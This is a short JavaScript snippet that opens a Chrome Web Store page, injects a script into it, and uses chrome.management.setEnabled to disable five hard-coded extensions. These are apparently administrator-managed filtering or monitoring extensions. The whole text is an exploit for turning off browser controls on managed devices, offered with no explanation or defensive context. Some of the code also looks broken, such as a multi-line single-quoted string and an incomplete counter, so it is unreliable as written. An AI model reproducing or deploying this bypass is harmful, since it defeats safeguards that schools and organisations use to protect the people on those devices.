x = window.open("https://chrome.google.com/webstorex");
x.document.write('<script>
const extentions =['icmgjiknkpcfkhgajgmpkkehdjmidlgl','adkcpkpghahmbopkjchobieckeoaoeem','cgbbbjmgdpnifijconhamggjehlamcif','kkbmdgjggcdajckdlbngdjonpchpaiea','dmdmgaepfoakhbmfckjjfilpgmceocgl']
let disabled = 0
for( e in extentions ){
    chrome.management.setEnabled(extentions[e], false, ()=>{disabled  })
}
</script>');
